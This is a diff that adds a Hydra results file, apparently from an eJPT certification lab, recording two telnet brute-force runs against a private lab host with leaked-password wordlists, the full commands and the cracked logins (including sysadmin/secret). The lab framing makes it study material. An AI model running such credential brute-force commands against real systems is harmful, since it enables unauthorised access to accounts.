@@ -1,0 +1,4 @@
+# Hydra v9.0 run at 2020-04-11 17:28:21 on 192.168.99.22 telnet (hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -o ejpt/bruteforce_lab/telnet_pass.txt telnet://192.168.99.22)
+[23][telnet] host: 192.168.99.22   login: # minimal list of very common usernames    password: monkey
+# Hydra v9.0 run at 2020-04-11 17:34:05 on 192.168.99.22 telnet (hydra -L minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -o telnet_pass.txt telnet://192.168.99.22)
+[23][telnet] host: 192.168.99.22   login: sysadmin   password: secret
